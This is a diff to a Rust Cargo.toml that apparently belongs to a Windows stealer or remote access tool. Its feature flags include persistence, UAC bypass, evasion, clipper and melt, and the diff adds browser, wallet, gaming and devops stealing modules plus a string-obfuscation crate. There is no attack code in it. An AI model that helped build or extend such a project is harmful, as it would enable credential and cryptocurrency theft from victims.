@@ -4,7 +4,10 @@ version = "0.1.0"
 edition = "2024"
 
 [features]
-default = ["screenshot", "webcam", "clipboard", "persistence", "uac", "evasion", "clipper", "melt"]
+default = [
+    "screenshot", "webcam", "clipboard", "persistence", "uac", "evasion", "clipper", "melt",
+    "browser", "communication", "gaming", "wallet", "system", "network", "devops"
+]
 embedded_payload = []
 embedded_persistence_dll = []
 screenshot = ["dep:image"]
@@ -16,6 +19,14 @@ evasion = []
 clipper = []
 melt = []
 
+browser = []
+communication = []
+gaming = []
+wallet = []
+system = []
+network = []
+devops = []
+
 [dependencies]
 async-trait = "0.1"
 thiserror = "1.0"
@@ -25,6 +36,7 @@ tracing-subscriber = { version = "0.3", features = ["fmt", "env-filter"] }
 directories = "5.0"
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
+log = "0.4"
 image = { version = "0.25", default-features = false, features = ["png"], optional = true }
 nokhwa = { version = "0.10.10", default-features = false, features = ["input-native"], optional = true }
 aes-gcm = "0.10"
@@ -36,8 +48,7 @@ walkdir = "2.3.3"
 quick-xml = "0.27"
 roxmltree = "0.18"
 # reqwest = { version = "0.12", features = ["json", "rustls-tls", "multipart"] }
-zip = { version = "7.1.0", default-features = false, features = ["aes-crypto", "deflate"] }
-rusqlite = { version = "0.33", features = ["bundled"] }
+zip = { version = "7.1.0", default-features = false, features = ["aes-crypto", "deflate", "chrono"] }
 aes = "0.8.4"
 cfb8 = "0.8"
 hex = "0.4.3"
@@ -47,41 +58,43 @@ ntapi = "0.4"
 libc = "0.2"
 uuid = { version = "1.7", features = ["v4"] }
 chrono = { version = "0.4.43", features = ["serde"] }
-
-[dependencies.windows]
-version = "0.52"
+litcrypt = "0.3"
+[dependencies.windows-sys]
+version = "0.59"
 features = [
-    "implement",
     "Win32_Foundation",
     "Win32_Graphics_Gdi",
     "Win32_Storage_FileSystem",
     "Win32_System_Diagnostics_ToolHelp",
     "Win32_System_Diagnostics_Debug",
     "Win32_System_DataExchange",
-    "Win32_System_Ole",
     "Win32_System_Com",
     "Win32_System_Memory",
     "Win32_System_SystemInformation",
-    "Win32_System_Kernel",
     "Win32_System_ProcessStatus",
     "Win32_System_Threading",
     "Win32_Security_Cryptography",
     "Win32_System_LibraryLoader",
     "Win32_UI_WindowsAndMessaging",
+    "Win32_System_Console",
     "Win32_Globalization",
-    "Win32_System_SystemServices",
-    "Win32_System_Wmi",
-    "Win32_System_TaskScheduler",
-    "Win32_System_Variant",
+    "Win32_System_Services",
     "Win32_NetworkManagement_IpHelper",
     "Win32_Networking_WinSock",
     "Win32_Networking_WinHttp",
-    "Win32_NetworkManagement_Ndis",
     "Win32_UI_Input_KeyboardAndMouse",
+    "Win32_Devices_DeviceAndDriverInstallation",
+    "Win32_System_Kernel",
+    "Win32_NetworkManagement_Ndis",
+    "Win32_System_Ole",
+    "Win32_System_Variant",
+    "Win32_System_Registry",
+    "Win32_System_Wmi",
 ]
 
 [build-dependencies]
 rand = { version = "0.8", features = ["std"] }
+hex = "0.4"
 
 [target.'cfg(windows)'.build-dependencies]
 winres = "0.1"
